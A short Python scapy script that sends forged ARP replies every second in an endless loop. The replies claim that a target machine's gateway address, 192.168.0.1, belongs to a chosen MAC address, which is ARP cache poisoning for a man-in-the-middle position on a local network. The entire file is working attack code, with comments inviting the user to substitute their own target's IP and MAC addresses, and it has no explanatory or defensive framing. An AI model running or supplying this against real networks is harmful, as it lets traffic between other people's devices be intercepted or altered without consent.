from scapy.all import ARP, Ether, sendp
import time

def send_arp_reply(target_ip, target_mac, sender_ip, sender_mac):
    arp_reply = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=sender_ip, hwsrc=sender_mac)
    sendp(Ether(dst=target_mac) / arp_reply, verbose=False)

if __name__ == "__main__":
    # Replace these values with the target and sender IP and MAC addresses
    target_ip = "192.168.0.193"  # The IP address of the target machine
    target_mac = "B4-8C-9D-E0-2D-E6"  # The MAC address of the target machine
    sender_ip = "192.168.0.1"  # The IP address of the sender
    sender_mac = "50-2b-73-88-50-c0"  # The MAC address of the sender

    while True:
        send_arp_reply(target_ip, target_mac, sender_ip, sender_mac)
        time.sleep(1)  # Send ARP replies every 1 second
